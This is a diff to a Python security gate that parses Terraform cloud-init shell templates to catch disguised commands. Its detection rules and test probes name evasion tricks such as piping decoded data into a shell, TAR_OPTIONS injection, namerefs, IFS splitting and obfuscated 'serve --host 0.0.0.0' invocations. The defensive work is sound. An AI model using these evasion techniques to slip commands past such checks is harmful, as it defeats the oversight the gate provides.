+def use_glob(val: str) -> str:
+    """A use's text as a glob over absolute paths (#5095). An expansion, substitution,
+    brace or tilde stands for any text; repeated slashes, ./ and ../ segments collapse
+    (a ../ after any wildcard may climb anywhere); a relative name may sit under any
+    working directory. So no spelling of a path can hide it from rule R5."""
+    g = re.sub(r"\$\{[^}]*\}|\$\([^)]*\)|\$\w+|\$[@*#?!$-]|`[^`]*`|\{[^{}]*\}|~[^/]*", "*", val)
+    g = re.sub(r"/+", "/", g)
+    segs = g.split("/")
+    ups = [i for i, sg in enumerate(segs) if sg == ".."]
+    if ups and any(re.search(r"[*?\[]", sg) for sg in segs[:ups[-1]]):
+        g = "*/" + "/".join(segs[ups[-1] + 1:])
+    elif g:
+        g = posixpath.normpath(g)
+        g = "/" + g.lstrip("/") if g.startswith("/") else g
+    if g in (".", ""):
+        return ""
+    return g if g.startswith(("/", "*")) else "*/" + g
+
+
+def runs_path(path: str, uses: list) -> bool:
+    """True when a use that is not known safe names path, a glob matching it, or a parent.
+    Every use is compared in canonical glob form (use_glob, #5095)."""
+    return path_runner(path, uses) is not None
+
+
+# rule R5: data-home path -> the use that made the gate read it as script, kept for the
+# self-test failure line only; it never changes a verdict (#5385)
+R5_READ_AS_SCRIPT = {}
+
+
+def path_runner(path: str, uses: list):
+    """The first use that runs_path counts as naming path, or None."""
+    path = "/" + posixpath.normpath(path).lstrip("/")
+    for val, safe in uses:
+        if safe is True or not val:
+            continue
+        g = use_glob(val)
+        if g == "/":
+            return val
+        if not re.search(r"[^*/]", g):
+            # a bare expansion names no place; where it is run, bare_operand_problem
+            # requires it to resolve (closed world, #5095)
+            continue
+        wild = re.search(r"[*?\[]", g) is not None
+        if safe == "exact":
+            if g == path or (wild and fnmatch.fnmatchcase(path, g)):
+                return val
+            continue
+        if path in val or path in g:
+            return val
+        if wild and fnmatch.fnmatchcase(path, g):
+            return val
+        # a directory names every file under it; a relative bare word with no slash is
+        # not a directory operand the gate can place (systemctl unit names and the like)
+        if (g.startswith("/") or "/" in val) and fnmatch.fnmatchcase(path, g.rstrip("/") + "/*"):
+            return val
+    return None
+
+
+def file_is_data(path: str, mode, info) -> bool:
+    """Rule R5 (see DATA_HOMES): True only when the gate can show path is never run."""
+    if info is None:
+        return True
+    if mode is not None:
+        m = mode.strip().strip("'\"")
+        if not re.fullmatch(r"[0-7]{3,4}", m) or int(m, 8) & 0o111:
+            return False
+    if not path.startswith(DATA_HOMES) or ".." in path.split("/"):
+        return False
+    runner = path_runner(path, info["uses"])
+    if runner is not None:
+        R5_READ_AS_SCRIPT.setdefault(path, runner)
+    return runner is None
+
+
+def heredoc_target(joined: str, consts: dict):
+    """The literal path a ``cat > PATH <<DELIM`` line writes, else None."""
+    t = tokenize(tf_render(joined))
+    if t is None:
+        return None
+    cmds, subs, ansi = t
+    found = None
+    for words, _pipe_in, term in cmds:
+        if not any(re.match(r"^\d*<<", w) for w in words):
+            continue
+        if found is not None or subs or ansi or term == "|":
+            return None
+        idx, scripts = resolve(words)
+        if idx is None or scripts or unquote(words[idx])[0] != "cat":
+            return None
+        tgt, k = None, idx + 1
+        while k < len(words):
+            w = words[k]
+            rm = REDIR_RE.match(w)
+            if rm is None or w.startswith(("<(", ">(")):
+                return None
+            op = w[:len(w) - len(rm.group(1))]
+            arg = rm.group(1) or (words[k + 1] if k + 1 < len(words) else "")
+            if op in (">", ">>", ">|"):
+                if tgt is not None:
+                    return None
+                tgt = subst_consts(arg, consts)
+            elif not re.fullmatch(r"\d*<<-?", op):
+                return None
+            k += 1 if rm.group(1) else 2
+        if tgt is None:
+            return None
+        val, exp = unquote(tgt)
+        if exp or not BARE_LITERAL_RE.match(val) or not val.startswith("/"):
+            return None
+        found = val
+    return found
 
 
 def skip_prefix(words: list, i: int) -> int:
@@ -823,7 +1566,7 @@ def shell_script_word(base: str, args: list):
     return False, None
 
 
-def companion_hits(stmt: str, st: dict, depth: int = 0) -> list:
+def companion_hits(stmt: str, st: dict, depth: int = 0, bins=frozenset()) -> list:
     """Refusals for one bash statement (see the module docstring)."""
     if depth > 8:
         return ["nesting deeper than 8 levels"]
@@ -833,9 +1576,40 @@ def companion_hits(stmt: str, st: dict, depth: int = 0) -> list:
             return ["unparsable statement holding $ or a backtick"]
         return []
     cmds, subs, ansi = t
+    # Keep the directive-marked words for the ai-memory option check; every other rule reads
+    # the words as terraform renders them when the directive's text is kept (#4837 R11).
+    # A word that was only a directive is dropped from the words, and its mark moves onto
+    # the next kept raw word (or the last one), so a directive standing alone before the
+    # subcommand still reaches the ai-memory check (#4837 R12).
+    marked = []
+    for words, pipe_in, term in cmds:
+        kept, raws, carry = [], [], ""
+        for w in words:
+            plain = w.replace(TF_DIRECTIVE_MARK, "")
+            if not plain and w:
+                carry = TF_DIRECTIVE_MARK
+                continue
+            kept.append(plain)
+            raws.append(carry + w)
+            carry = ""
+        if carry and raws:
+            raws[-1] += carry
+        marked.append((kept, pipe_in, term, raws))
+    cmds = [(m[0], m[1], m[2]) for m in marked]
+    raw_of = {id(m[0]): m[3] for m in marked}
+    subs = [x.replace(TF_DIRECTIVE_MARK, "") for x in subs]
     out = []
     if ansi:
         out.append("ANSI-C or locale quoting ($' or $\")")
+    # an extended glob ?( *( +( @( !( ends a word the tokenizer splits at "(": the name it
+    # expands to (a data file or the binary) is unreadable, so it is refused (R11). The
+    # tokenizer gives a lone "!" for both "! (cmd)" (negation) and "!(x)" (an extended glob
+    # as an argument or at command position), so an unquoted "!(" with no blank between
+    # is refused from the text (#5325); a quoted "!" before "(" is a bash syntax error
+    mask_x, _ = unquoted_mask(stmt, None)
+    if (any(term == "(" and words and words[-1] != "!" and words[-1][-1:] in "?*+@!" for words, _p, term in cmds)
+            or any(mask_x[i] and stmt[i:i + 2] == "!(" for i in range(len(stmt) - 1))):
+        out.append("extended glob pattern (the gate cannot read the name it expands to)")
     runs_shell = False
     decodes = False
     for words, pipe_in, term in cmds:
@@ -856,12 +1630,23 @@ def companion_hits(stmt: str, st: dict, depth: int = 0) -> list:
             if sexp:
                 out.append("expanded or unresolvable script given to a wrapper (-c/-S)")
             else:
-                out.extend(companion_hits(sv, {}, depth + 1))
+                out.extend(companion_hits(sv, {}, depth + 1, bins))
+        if not st.get("data") and not (idx is None and scripts):
+            why = operand_problem(words, idx, bins)
+            if why is not None:
+                out.append(why)
+            why = bare_operand_problem(words, idx, bins)
+            if why is not None:
+                out.append(why)
         if idx is None:
             if term in (";;", ";&") and st.get("case", 0) > 0:
                 st["pattern"] = True
             continue
         cw = words[idx]
+        if st.get("data") and "$" not in cw.replace(TF_VALUE, "") and "`" not in cw:
+            # A data line is one the gate has shown is never run (rule R5, see DATA_HOMES):
+            # a template value in it is plain text (#4837 R12).
+            cw = cw.replace(TF_VALUE, "TFVALUE")
         val, exp = unquote(cw)
         if exp or "$" in cw or "`" in cw:
             out.append("command word %r is an expansion or command substitution" % cw[:40])
@@ -883,22 +1668,49 @@ def companion_hits(stmt: str, st: dict, depth: int = 0) -> list:
             # #4837 R6: the subcommand must be a literal word the serve rule can read.
             if any(posixpath.basename(unquote(w)[0]) == "xargs" for w in words[:idx]):
                 out.append("ai-memory under xargs (its subcommand comes from stdin)")
-            after_flag = False
-            for w in args:
-                wv, wexp = unquote(w)
-                if wexp or "$" in w or "`" in w:
-                    if not after_flag:
-                        out.append("ai-memory subcommand position holds an expansion %r" % w[:40])
+            # #4837 R12 closed world: up to the subcommand every word is a flag word, the
+            # value of a value-taking root flag, "--", or the subcommand itself. A value
+            # (separate or after "=") must be in the value grammar; the subcommand and the
+            # word after "--" must be bare literals. Anything else is red.
+            want_value, skip = False, False
+            for rw in raw_of[id(words)][idx + 1:]:
+                if skip:
+                    skip = False
+                    if TF_VALUE in rw or TF_DIRECTIVE_MARK in rw:
+                        out.append(REDIR_TF_HIT)
                         break
-                    after_flag = False
                     continue
-                if wv.startswith("-"):
-                    after_flag = "=" not in wv
+                rm = REDIR_RE.match(rw)
+                if rm is not None and not rw.startswith(("<(", ">(")):
+                    # a redirection is not an argument; bash removes it and its target. The
+                    # target is still rendered text: a terraform value in it can end the
+                    # redirection and supply the subcommand (#4837 R12 R3, #5099)
+                    if TF_VALUE in rw or TF_DIRECTIVE_MARK in rw:
+                        out.append(REDIR_TF_HIT)
+                        break
+                    skip = not rm.group(1)
                     continue
-                if after_flag:
-                    after_flag = False
+                if want_value:
+                    why = value_word_problem(rw)
+                    if why is not None:
+                        out.append("ai-memory option value: %s" % why)
+                        break
+                    want_value = False
                     continue
-                break
+                if rw == "--" and want_value is not None:
+                    want_value = None
+                    continue
+                if want_value is None or not FLAG_WORD_RE.match(rw.split("=", 1)[0]) or rw == "-":
+                    if not BARE_LITERAL_RE.match(rw):
+                        out.append("ai-memory subcommand %r is not a bare literal word" % rw[:40])
+                    break
+                if "=" in rw:
+                    why = value_word_problem(rw.split("=", 1)[1])
+                    if why is not None:
+                        out.append("ai-memory option value: %s" % why)
+                        break
+                    continue
+                want_value = rw in AI_MEMORY_VALUE_FLAGS
         if base in ("source", ".") and args and re.match(r"^[\"']?[<$]\(", args[0]):
             out.append("source of a substitution")
         is_shell = base in SHELLS
@@ -914,7 +1726,7 @@ def companion_hits(stmt: str, st: dict, depth: int = 0) -> list:
                     if sexp:
                         out.append("expanded %s -c script %r" % (base, sw[:40]))
                     elif is_shell:
-                        out.extend(companion_hits(sval, {}, depth + 1))
+                        out.extend(companion_hits(sval, {}, depth + 1, bins))
             elif pipe_in:
                 out.append("pipe into %s (stdin is the program)" % base)
             for k, a in enumerate(args):
@@ -928,7 +1740,7 @@ def companion_hits(stmt: str, st: dict, depth: int = 0) -> list:
         if base == "openssl" and "-d" in args:
             decodes = True
     for sub in subs:
-        out.extend(companion_hits(sub, {}, depth + 1))
+        out.extend(companion_hits(sub, {}, depth + 1, bins))
     if decodes and runs_shell:
         out.append("decoded data in a statement that runs a shell")
     return out
@@ -1054,10 +1866,11 @@ def triggered(line: Line) -> bool:
     return bool(TRIGGER_RE.search(v1) or TRIGGER_RE.search(v2))
 
 
-def parse_template(name: str, text: str):
+def parse_template(name: str, text: str, info=None):
     """Return (lines, hits, entries, statements). ``entries`` maps a write_files
     path to its keys; ``statements`` lists (where, text, state) for the
-    companion rule."""
+    companion rule. ``info`` (modes, consts, uses) drives rule R5; None keeps
+    every non-script block data, for the first pass only."""
     text = DIRECTIVE_LINE_RE.sub("", text)
     phys = text.split("\n")
     if phys and phys[-1] == "":
@@ -1141,7 +1954,7 @@ def parse_template(name: str, text: str):
                 while j > i + 1 and not phys[j - 1].strip():
                     j -= 1
                 block_no += 1
-                parse_block(name, cur_path, phys, i + 1, j, lines, hits, stmts, block_no)
+                parse_block(name, cur_path, phys, i + 1, j, lines, hits, stmts, block_no, info)
                 i = j
                 continue
             i += 1
@@ -1176,7 +1989,7 @@ def parse_template(name: str, text: str):
     return lines, hits, entries, stmts
 
 
-def parse_block(name, path, phys, a, b, lines, hits, stmts, block_no):
+def parse_block(name, path, phys, a, b, lines, hits, stmts, block_no, info=None):
     """Model the literal block phys[a:b] written to ``path``."""
     body = phys[a:b]
     first = next((x for x in body if x.strip()), None)
@@ -1193,14 +2006,18 @@ def parse_block(name, path, phys, a, b, lines, hits, stmts, block_no):
         kind = "script"
     elif is_unit:
         kind = "unit"
-    else:
+    elif file_is_data(path, None if info is None else info["modes"].get(path), info):
         kind = "data"
+    else:
+        # R5: a no-shebang file the gate cannot show is never run is checked as a
+        # script (sh runs an ENOEXEC file as one), without a shebang line (#4837 R12).
+        kind = "script"
     k = 0
-    if kind == "script":
+    if ded[0].startswith("#!"):
         lines.append(Line(path, "shebang", ded[0], a + 1, a + 1, block=block_no))
         k = 1
     qs = None
-    heredocs = []  # pending (delim, strip_tabs, quoted)
+    heredocs = []  # pending (delim, strip_tabs, quoted, body_is_data)
     stmt_buf, stmt_first = [], None
     st = {}
     m = len(ded)
@@ -1223,14 +2040,14 @@ def parse_block(name, path, phys, a, b, lines, hits, stmts, block_no):
             k += 1
             continue
         if heredocs:
-            delim, strip_tabs, quoted = heredocs[0]
+            delim, strip_tabs, quoted, hd_data = heredocs[0]
             chk = x.lstrip("\t") if strip_tabs else x
             lines.append(Line(path, "heredoc", x, a + k + 1, a + k + 1, block=block_no))
             if chk == delim:
                 heredocs.pop(0)
                 k += 1
                 continue
-            stmts.append(("%s:%d" % (name, a + k + 1), x, {"data": True}))
+            stmts.append(("%s:%d" % (name, a + k + 1), x, {"data": True} if hd_data else {}))
             if not quoted:
                 for sub in dq_subs(x):
                     if sub is None:
@@ -1258,11 +2075,16 @@ def parse_block(name, path, phys, a, b, lines, hits, stmts, block_no):
         if is_comment:
             continue
         joined = ln.joined
-        for hd in heredoc_starts(joined, qs):
+        starts = heredoc_starts(joined, qs)
+        hd_data = info is None
+        if info is not None and len(starts) == 1 and starts[0] != "bad":
+            tgt = heredoc_target(joined, info["consts"])
+            hd_data = tgt is not None and file_is_data(tgt, "0644", info)
+        for hd in starts:
             if hd == "bad":
                 hits.append("%s:%d: heredoc operator whose delimiter cannot be read" % (name, ln.first))
             else:
-                heredocs.append(hd)
+                heredocs.append(tuple(hd) + (hd_data,))
         qs = scan_quotes(joined, qs)
         if stmt_first is None:
             stmt_first = ln.first
@@ -1445,6 +2267,13 @@ def userdata_hits(name: str, scope: str, text: str, maintf) -> list:
 
 
 # ---------------------------------------------------------------- allowlist
+# A pending entry skips the validators, so its tracker is a closed set with a ceiling on
+# the entries each one may hold (#5098): moving an approved line to the pending list, or
+# citing a placeholder issue, is a fault. Change this only in the PR that lands or files
+# the tracker; a ceiling only falls.
+PENDING_TRACKERS = {"#4610": 1, "#4671": 6, "#4712": 3}
+
+
 def load_entries(text: str, pending: bool, faults: list, label: str) -> list:
     """Parse allowlist text into (scope, issue, ctx, line, file_lineno)."""
     out = []
@@ -1458,11 +2287,14 @@ def load_entries(text: str, pending: bool, faults: list, label: str) -> list:
         head, ctx, line = parts[0], parts[1], parts[2]
         issue = None
         if pending:
-            hm = re.match(r"^(\S+) (#\d+)$", head)
+            hm = re.match(r"^(\S+) (#[1-9]\d*)$", head)
             if hm is None:
                 faults.append("%s:%d: malformed pending head %r (want '<scope> #<issue>')" % (label, no, head))
                 continue
             head, issue = hm.group(1), hm.group(2)
+            if issue not in PENDING_TRACKERS:
+                faults.append("%s:%d: tracker %s is not a known pending tracker" % (label, no, issue))
+                continue
         if head not in SCOPES:
             faults.append("%s:%d: unknown scope %r" % (label, no, head))
             continue
@@ -1473,6 +2305,10 @@ def load_entries(text: str, pending: bool, faults: list, label: str) -> list:
             faults.append("%s:%d: line is not whitespace-normalised" % (label, no))
             continue
         out.append((head, issue, ctx, line, no))
+    for tr, cap in sorted(PENDING_TRACKERS.items()) if pending else ():
+        n = sum(1 for e in out if e[1] == tr)
+        if n > cap:
+            faults.append("%s: tracker %s holds %d entries, more than its %d" % (label, tr, n, cap))
     return out
 
 
@@ -1504,10 +2340,12 @@ def scope_of(name: str) -> str:
 def tf_render(text: str) -> str:
     """What bash sees after terraform renders the template: ``$${`` is a
     literal ``${``, ``%%{`` a literal ``%{``, a ``%{ }`` directive vanishes and
-    each ``${expr}`` becomes an operator-supplied value (a plain word here)."""
+    each ``${expr}`` becomes the shell expansion ``${TFVALUE}``: the rendered
+    value is operator-supplied, so an unquoted one is word-split by the shell
+    and only a fully double-quoted word is safe (#4837)."""
     t = text.replace("$${", "\x00").replace("%%{", "\x01")
-    t = re.sub(r"%\{[^}]*\}", "", t)
-    t = re.sub(r"\$\{[^}]*\}", "TFVALUE", t)
+    t = re.sub(r"%\{[^}]*\}", TF_DIRECTIVE_MARK, t)
+    t = re.sub(r"\$\{[^}]*\}", lambda _m: TF_VALUE, t)
     return t.replace("\x00", "${").replace("\x01", "%{")
 
 
@@ -1532,14 +2370,313 @@ def tf_region_spans(text: str) -> list:
     return out
 
 
+def classify(name: str, text: str):
+    """parse_template to a fixpoint of rule R5: a block or heredoc stays data only
+    while no executed statement uses its path. Each pass can only move data to
+    executed, so the loop ends; failing to settle is a hit (fail closed)."""
+    lines, hits, entries, stmts = parse_template(name, text)
+    modes = {p: e.get("permissions") for p, e in entries.items()}
+    info = {"modes": modes, "consts": {}, "uses": []}
+    prev = None
+    for _ in range(8):
+        lines, hits, entries, stmts = parse_template(name, text, info)
+        sig = tuple((w, bool(st.get("data"))) for w, _s, st in stmts)
+        if sig == prev:
+            return lines, hits, entries, stmts
+        prev = sig
+        live = [x for x in stmts if not x[2].get("data")]
+        consts = literal_consts(live)
+        uses = []
+        for _w, stmt, _st in live:
+            path_uses(tf_render(stmt), consts, uses)
+        info = {"modes": modes, "consts": consts, "uses": expand_uses(uses, var_values(live))}
+    return lines, hits + ["%s: rule R5 did not settle on which files are data" % name], entries, stmts
+
+
+def nameref_facts(texts: list):
+    """(names, poisoned) for declare/typeset/local -n (#5174). A nameref and its target
+    share one value, and an assignment through the nameref writes the target, so every
+    name in an -n declaration, and every name assigned to a nameref, has a value the gate
+    cannot read. A target built from an expansion can be any name: then no name is
+    resolved (poisoned, fail closed). Bash removes quotes and backslashes before the
+    builtin reads its words, so the words are read without them; an option word that
+    holds an expansion can be -n (poisoned), and every name word of an -n declaration is
+    a nameref, not only the first (#5323, #5324)."""
+    refs, names, poisoned = set(), set(), False
+    plain = [re.sub(r"[\"'\\]", "", text) for text in texts]
+    for text in plain:
+        for m in re.finditer(r"(?<![\w$./-])(?:declare|typeset|local)(?![\w-])([^;&|\n]*)", text):
+            words, nameref, i = m.group(1).split(), False, 0
+            while i < len(words) and (words[i][:1] in "-+" or re.search(r"[$`]", words[i].split("=", 1)[0])):
+                if words[i] == "--":
+                    i += 1
+                    break
+                if re.search(r"[$`]", words[i]):
+                    nameref = poisoned = True
+                elif words[i].startswith("-") and "n" in words[i]:
+                    nameref = True
+                i += 1
+            if not nameref:
+                continue
+            for w in words[i:]:
+                refs.update(re.findall(r"(?<![\w$-])([A-Za-z_]\w*)", w.split("=", 1)[0]))
+                names.update(re.findall(r"(?<![\w$-])[A-Za-z_]\w*", w))
+                poisoned = poisoned or "$" in w or "`" in w
+    for text in plain:
+        for m in re.finditer(r"(?<![\w$])([A-Za-z_]\w*)(?:\[[^]]*\])?\+?=(\S*)", text):
+            if m.group(1) in refs:
+                names.update(re.findall(r"(?<![\w$-])[A-Za-z_]\w*", m.group(2)))
+                poisoned = poisoned or "$" in m.group(2) or "`" in m.group(2)
+    return names | refs, poisoned
+
+
+def word_end(text: str, i: int) -> int:
+    """Index just past the shell word that starts at text[i] (quotes, backslashes,
+    backticks and $( ) / array parentheses kept inside the word)."""
+    q, depth = None, 0
+    while i < len(text):
+        c = text[i]
+        if q is not None:
+            if c == "\\" and q != "'":
+                i += 1
+            elif c == q:
+                q = None
+        elif c == "\\":
+            i += 1
+        elif c in "'\"`":
+            q = c
+        elif c == "(":
+            depth += 1
+        elif c == ")":
+            if depth == 0:
+                break
+            depth -= 1
+        elif depth == 0 and (c.isspace() or c in ";&|<>"):
+            break
+        i += 1
+    return i
+
+
+ASSIGN_NAME_RE = re.compile(r"(?<![\w$])([A-Za-z_]\w*)(?:\[[^]]*\])?\+?=")
+
+
+def split_names(texts: list):
+    """(names, poisoned, seps): the names whose assigned value an unquoted expansion splits
+    into more than one word (#5327). The gate reads one value as one operand, so such a
+    name is not resolved: "/usr/bin/env <binary>" or "-c 0 <glob>" is a wrapper and a
+    binary, or a glob, once split. The split characters are blank, tab and newline plus
+    every character of a literal IFS value the template assigns; an IFS value the gate
+    cannot read (other than restoring a name that only ever holds $IFS) poisons every
+    non-empty value (fail closed, #4869)."""
+    words = []
+    for text in texts:
+        for m in ASSIGN_NAME_RE.finditer(text):
+            words.append((m.group(1), text[m.end():word_end(text, m.end())]))
+    seps, poisoned = set(" \t\n"), False
+    for name, word in words:
+        if name != "IFS":
+            continue
+        if expanded(word):
+            saved = re.fullmatch(r"\$\{?([A-Za-z_]\w*)\}?", unquote(word)[0])
+            held = [w for n, w in words if saved and n == saved.group(1)]
+            if not (held and all(re.fullmatch(r"\$\{?IFS\}?", unquote(w)[0]) for w in held)):
+                poisoned = True
+        else:
+            seps |= set(unquote(word)[0])
+    out = set()
+    for name, word in words:
+        val = re.sub(r"\$\([^()]*\)|`[^`]*`", "", unquote(word)[0])
+        if name != "IFS" and (any(c in seps for c in val) or (poisoned and val)):
+            out.add(name)
+    return out, poisoned, seps
+
+
+def var_values(stmts: list) -> dict:
+    """NAME -> every literal text the template assigns it (assignment, export, local,
+    declare, for-loop word) (#5095). A value only adds uses in expand_uses (the original
+    use stays), so a name an unquoted expansion splits keeps its values and also holds
+    each field, and a name read from input keeps every literal it is assigned anywhere,
+    since a read may run after the use, may not run, or may run in a subshell (#5356,
+    5-agent vote 4d3ea1c5). An IFS the gate cannot read collapses each split name past
+    the cap. A nameref can
+    carry any name's value to any other name, so a template that declares one maps every
+    name to VALUES_PAST_CAP (ANY_NAME): every use through a name reads as the root use
+    (fail closed, #5356, #4869)."""
+    vals = {}
+    for _w, stmt, _st in stmts:
+        text = tf_render(stmt)
+        for m in re.finditer(r"(?<![\w$])([A-Za-z_]\w*)(?:\[[^]]*\])?(\+?)=(\S*)", text):
+            v = unquote(m.group(3).rstrip(";"))[0]
+            # NAME+=text appends to every value NAME already holds; an append can repeat
+            # (a loop), so the prior value followed by any text is kept too (#5174)
+            if vals.get(m.group(1)) == {VALUES_PAST_CAP}:
+                continue
+            prior = set(vals.get(m.group(1), {""})) if m.group(2) else {""}
+            add = {p + v for p in prior} | ({p + "*" for p in prior} if m.group(2) else set())
+            vals.setdefault(m.group(1), set()).update(add)
+            # each append at least doubles the set: past EXPAND_CAP values the name stands for
+            # any text, and a use of it becomes the root use in expand_uses (#5329)
+            if len(vals[m.group(1)]) > EXPAND_CAP:
+                vals[m.group(1)] = {VALUES_PAST_CAP}
+        for m in re.finditer(r"(?:^|[\s;&|(])for\s+([A-Za-z_]\w*)\s+in\s+([^;\n]*)", text):
+            for wd in m.group(2).split():
+                vals.setdefault(m.group(1), set()).add(unquote(wd)[0])
+    texts = [tf_render(stmt) for _w, stmt, _st in stmts]
+    refs, poisoned = nameref_facts(texts)
+    if refs or poisoned:
+        return {ANY_NAME: {VALUES_PAST_CAP}}
+    # an IFS the gate cannot read leaves every split name unresolved in binary_vars, so
+    # each operand through one is red there; here the fields are cut on the known IFS
+    split, split_poisoned, seps = split_names(texts)
+    cut = re.compile("[%s]+" % re.escape("".join(sorted(seps))))
+    for k in split & set(vals):
+        if split_poisoned:
+            vals[k] = {VALUES_PAST_CAP}
+        elif VALUES_PAST_CAP not in vals[k]:
+            vals[k] = vals[k] | {f for v in vals[k] for f in cut.split(v) if f}
+    return vals
+
+
+EXPAND_CAP = 64
+# the value set of a name assigned more than EXPAND_CAP texts (#5329)
+VALUES_PAST_CAP = "\x00past-cap"
+# the var_values key that stands for every name, past the cap (#5356)
+ANY_NAME = "\x00any-name"
+
+
+def expand_uses(uses: list, values: dict) -> list:
+    """Each use with every plain $NAME / ${NAME} replaced by each value the template
+    assigns NAME, to depth 4 (#5095). The original use stays, so an unknown or operator
+    form still reads as a wildcard in use_glob. Past EXPAND_CAP variants, or through a
+    name whose values passed the cap in var_values (#5329), the use becomes the root use
+    "/", which runs_path reads as naming every path (fail closed, #5139: a bare wildcard
+    is skipped there as naming no place, so it would drop the use)."""
+    ref = re.compile(r"\$\{([A-Za-z_]\w*)\}|\$([A-Za-z_]\w*)")
+    out = []
+    for val, safe in uses:
+        out.append((val, safe))
+        if safe is True or "$" not in val:
+            continue
+        seen, todo, over = {val}, [val], False
+        for _ in range(4):
+            nxt = []
+            for v in todo:
+                m = next((x for x in ref.finditer(v) if ANY_NAME in values or (x.group(1) or x.group(2)) in values), None)
+                if m is None:
+                    continue
+                reps = values.get(m.group(1) or m.group(2), values.get(ANY_NAME, set()))
+                over = over or VALUES_PAST_CAP in reps
+                for rep in reps - {VALUES_PAST_CAP}:
+                    w = v[:m.start()] + rep + v[m.end():]
+                    if w not in seen:
+                        seen.add(w)
+                        nxt.append(w)
+            todo = nxt
+            over = over or len(seen) > EXPAND_CAP
+            if over:
+                break
+        if not over:
+            out.extend((v, safe) for v in seen if v != val)
+        else:
+            out.append(("/", safe))
+    return out
+
+
+def binary_vars(stmts: list) -> frozenset:
+    """Names the template may give the ai-memory binary's path (rule R4, #5094), to a
+    fixpoint: an assignment, export, local or declare whose value is a binary reference,
+    a substitution that names ai-memory (command -v, which, readlink, realpath ...) or
+    expands a tracked name; and a for-loop variable whose list holds such a word."""
+    out = set()
+    assigns = []
+    unknown = set()
+    for _w, stmt, _st in stmts:
+        text = tf_render(stmt)
+        assigns.extend((m.group(1), m.group(2), text[m.start(2):])
+                       for m in re.finditer(r"(?<![\w$])([A-Za-z_]\w*)(?:\[[^]]*\])?\+?=(\S*)", text))
+        for m in re.finditer(r"(?:^|[\s;&|(])for\s+([A-Za-z_]\w*)\s+in\s+([^;\n]*)", text):
+            assigns.extend((m.group(1), wd, wd) for wd in m.group(2).split())
+            assigns.append((m.group(1), m.group(2), m.group(2)))
+        for m in re.finditer(r"(?:^|[\s;&|(])(?:read|mapfile|readarray)\b([^;&|\n]*)", text):
+            unknown.update(re.findall(r"(?<![\w$-])[A-Za-z_]\w*", m.group(1)))
+        unknown.update(re.findall(r"\bprintf\s+-v\s*([A-Za-z_]\w*)", text))
+        unknown.update(re.findall(r"\bgetopts\s+\S+\s+([A-Za-z_]\w*)", text))
+        # an array, an append (+=) or a glob in the value is not the text the operand
+        # expands to (#5219, #5174); namerefs are read by nameref_facts below
+        for m in re.finditer(r"(?<![\w$])([A-Za-z_]\w*)(\[[^]]*\])?(\+?)=(\S*)", text):
+            if m.group(2) or m.group(3) or m.group(4).startswith("(") or re.search(r"[*?\[]", m.group(4)):
+                unknown.add(m.group(1))
+    while True:
+        n = len(out)
+        for name, word, rest in assigns:
+            if name in out:
+                continue
+            sub = re.match(r"""["']?(\$\(|`)""", rest)
+            if sub:
+                # the substitution's own text: up to its closing parenthesis or backtick
+                rest = rest[sub.start(1):]
+                depth, j = 0, 0
+                if rest.startswith("`"):
+                    j = rest.find("`", 1)
+                    rest = rest if j < 0 else rest[:j + 1]
+                else:
+                    for j, ch in enumerate(rest):
+                        depth += ch == "("
+                        depth -= ch == ")"
+                        if depth == 0 and ch == ")":
+                            rest = rest[:j + 1]
+                            break
+            if (binary_ref(word.rstrip(";"), frozenset(out))
+                    or (sub and re.search(r"(?<![\w.-])ai-memory(?![\w./-])", rest))
+                    or any(re.search(r"\$\{?[#!]?" + re.escape(b) + r"(?!\w)", rest if sub else word) for b in out)):
+                out.add(name)
+        if len(out) == n:
+            break
+    # resolved names, to a fixpoint: every value is literal text and every expansion in it
+    # is a positional parameter or a resolved name
+    names = {a[0] for a in assigns}
+    # a nameref target built from an expansion is refused for the whole template in
+    # analyse, which is the one fail-closed path for it (#5330)
+    refs = nameref_facts([tf_render(stmt) for _w, stmt, _st in stmts])[0]
+    unknown |= refs | split_names([tf_render(stmt) for _w, stmt, _st in stmts])[0]
+    resolved = set()
+    while True:
+        n = len(resolved)
+        for name in names - resolved - unknown - out:
+            vals = [a[1] for a in assigns if a[0] == name]
+            if all("`" not in v and "$(" not in v
+                   and all(r in resolved for r in re.findall(r"\$\{?[#!]?([A-Za-z_]\w*)", v)) for v in vals):
+                resolved.add(name)
+        if len(resolved) == n:
+            break
+    facts = VarFacts(out)
+    facts.resolved = frozenset(resolved)
+    return facts
+
+
 def analyse(name: str, text: str, cache: dict):
     key = (name, text)
     if key not in cache:
-        lines, hits, entries, stmts = parse_template(name, text)
+        lines, hits, entries, stmts = classify(name, text)
+        bins = binary_vars(stmts)
         comp = []
         for where, stmt, st in stmts:
-            for why in companion_hits(tf_render(stmt), st):
+            for why in companion_hits(tf_render(stmt), st, 0, bins):
                 comp.append("%s: companion rule: %s" % (where, why))
+            if re.search(r"(?<![\w$])TAR_OPTIONS(?!\w)", re.sub(r"[\"'\\]", "", tf_render(stmt))):
+                # GNU tar reads options from TAR_OPTIONS too: a rename or program option
+                # there is invisible to tar_risky, which reads argv (#5093 R11). Quotes and
+                # backslashes are dropped first: export TAR_""OPTIONS=x sets the same name
+                comp.append("%s: companion rule: %s" % (where, TAR_ENV_HIT))
+            if built_name(tf_render(stmt)):
+                comp.append("%s: companion rule: %s" % (where, BUILT_NAME_HIT))
+        # a nameref whose target is built from an expansion can name TAR_OPTIONS too
+        # (#5326); refused at the first statement that makes the namerefs poisoned
+        texts = [tf_render(stmt) for _w, stmt, _st in stmts]
+        if nameref_facts(texts)[1]:
+            k = next((k for k in range(len(texts)) if nameref_facts(texts[:k + 1])[1]), len(texts) - 1)
+            comp.append("%s: companion rule: nameref target built from an expansion (%s)"
+                        % (stmts[k][0], BUILT_NAME_HIT))
         homes = service_homes(lines)
         trig = [ln for ln in lines if triggered(ln)]
         cache[key] = (lines, hits + comp, entries, trig, homes)
@@ -1924,12 +3061,236 @@ def build_probes() -> list:
         ("backslash-split serve in the provision script, listed (#4837 R6)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory s\\erve --host 0.0.0.0\n" + dec)]),
         ("ai-memory subcommand in a variable, listed (#4837 R6)", [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db /x "$V" --host 0.0.0.0\n' + dec)]),
         ("ai-memory under xargs, listed (#4837 R6)", [(dec, "      echo serve | xargs /usr/local/lib/ai-memory/bin/ai-memory\n" + dec)]),
+        ("ai-memory subcommand in a variable after --json, listed (#4837 R7)", [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --json "$V" --host 0.0.0.0\n' + dec)]),
